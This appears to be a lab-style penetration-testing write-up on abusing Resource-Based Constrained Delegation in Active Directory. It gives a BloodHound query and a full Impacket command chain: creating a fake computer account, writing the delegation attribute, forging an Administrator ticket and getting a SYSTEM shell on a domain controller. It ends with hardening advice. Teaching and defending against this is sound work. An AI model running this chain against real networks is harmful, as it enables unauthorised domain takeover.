# Attack Path: Resource-Based Constrained Delegation (RBCD)
*The Path to Domain Dominance*

---

<div class="key-concept" markdown="1">
**Executive Summary:**
Resource-Based Constrained Delegation (RBCD) is a critical Active Directory misconfiguration that allows an attacker to escalate from a standard user to Domain Admin permissions.
</div>

Unlike traditional attacks that require high privileges, RBCD exploits a subtle permission: **Write access on a computer object.**

---

## The Attack Concept

<div class="vulnerability-alert" markdown="1">
**The Core Vulnerability:**
The attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` controls which services can impersonate users to a specific computer. If an attacker can write to this attribute, they control who can access the machine.
</div>

---

## Phase 1: Reconnaissance

We use **BloodHound** to identify the vulnerability. We are looking for an edge that allows us to modify a computer object.

<div class="key-concept" markdown="1">
**BloodHound Query:**
`MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p`
</div>

---

## Phase 2: Exploitation

**Scenario:** User `Stannis` has GenericWrite on `KINGSLANDING$` (Domain Controller).

### Step A: Create the "Fake" Service

We need a service account to interact with Kerberos. We use the default `MachineAccountQuota` (typically 10) to create one.

```bash
# Create fake computer account
proxychains addcomputer.py domain/stannis:Pass -method LDAPS -computer-name EVILPC$
```

<div class="success-box" markdown="1">
**[+] EVILPC$ created successfully!**
</div>

### Step B: Weaponize the Target

We write our new computer's SID into the target's delegation attribute.

```bash
# Modify msDS-AllowedToActOnBehalfOfOtherIdentity
proxychains rbcd.py domain/stannis:Pass -delegate-from EVILPC$ -delegate-to KINGSLANDING$ -action write
```

<div class="success-box" markdown="1">
**[+] Attribute modified successfully.**
</div>

### Step C: The Kerberos Abuse

We request the impersonation ticket (S4U2Self + S4U2Proxy) for the Administrator account.

```bash
# Get Service Ticket
proxychains getST.py domain/EVILPC$:Pass -spn cifs/kingslanding -impersonate Administrator
```

<div class="success-box" markdown="1">
**[+] Saving ticket to Administrator.ccache**
</div>

---

## Phase 3: Domain Dominance

With the ticket in hand, we execute commands as **SYSTEM** on the Domain Controller.

```bash
export KRB5CCNAME=Administrator.ccache
proxychains wmiexec.py domain/Administrator@kingslanding -k -no-pass
```

<div class="success-box" markdown="1">
**C:\Windows\system32> whoami**
**nt authority\system**
</div>

---

## Remediation

<div class="warning-box" markdown="1">
**How to protect your environment:**

- **Restrict MachineAccountQuota:** Set it to 0 so users cannot create "Fake Services."
- **Tiered Administration:** Ensure standard users do not have Write permissions on Tier 0 assets (DCs).
- **Monitoring:** Alert on changes to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
</div>

## Key Takeaways

<div class="takeaway-box" markdown="1">
**RBCD exploits Write access on computer objects** - Often overlooked in audits
</div>

<div class="takeaway-box" markdown="1">
**MachineAccountQuota is a default enabler** - Setting it to 0 is a critical hardening step
</div>

<div class="takeaway-box" markdown="1">
